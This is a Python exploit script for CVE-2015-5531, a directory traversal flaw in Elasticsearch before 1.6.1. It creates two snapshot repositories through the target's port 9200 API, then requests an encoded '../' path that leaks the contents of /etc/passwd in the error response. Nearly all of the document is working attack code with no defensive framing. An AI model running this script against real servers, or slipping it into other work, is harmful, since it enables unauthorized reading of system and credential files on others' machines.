import requests
import json
requests.packages.urllib3.disable_warnings()
def run(url):
    """Version: < 1.6.1
    CVE-2015-5531"""
    data = {
        "type": "fs",
        "settings": {
            "location": "/usr/share/elasticsearch/repo/test"   # /tmp/test
        }
    }
    req = requests.put(url + ':9200/_snapshot/test', data=json.dumps(data), timeout=3)

    if 'true' in req.text and req.status_code == 200:
        print('[+] build backup success ')
        data2 = {
            "type": "fs",
            "settings": {
                "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata" 
            }
        }
        req2 = requests.put(url+':9200/_snapshot/test2', data=json.dumps(data2), timeout=3)
        if 'true' in req2.text and req2.status_code == 200:
            print('[+] build snapshot success ')

            req3 = requests.get(url+':9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', timeout=3)
            if req3.status_code == 400:
                print(req3.text)
                return 'reading /etc/passwd '
            else:
                return False